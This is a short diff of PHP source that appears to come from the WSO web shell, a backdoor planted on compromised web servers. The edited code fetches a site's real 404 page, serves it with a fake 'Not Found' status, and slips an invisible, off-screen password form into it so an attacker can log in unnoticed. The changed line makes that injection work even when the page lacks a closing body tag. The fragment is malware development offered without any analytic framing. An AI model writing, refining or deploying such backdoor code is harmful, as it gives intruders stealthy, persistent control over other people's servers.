@@ -53,7 +53,7 @@ try {
 		$rand = rand(1e3, 1e4);
 		$auth_form = "<form method=post style='position:fixed;left:-1000px;'><input type=text name=pass autofocus=true></form></body>";
 		$body = str_replace('/notexist' . $rand, $_SERVER['SCRIPT_NAME'], wsoGetFile('http://' . $_SERVER['HTTP_HOST'] . '/notexist' . $rand));
-		$body = str_replace('</body>', $auth_form, $body);
+		$body = stripos($body, '</body>')?str_replace('</body>', $auth_form, $body):$body.$auth_form;
 		
 		header('HTTP/1.0 404 Not Found');
 		die(!empty($body)?$body:$auth_form);
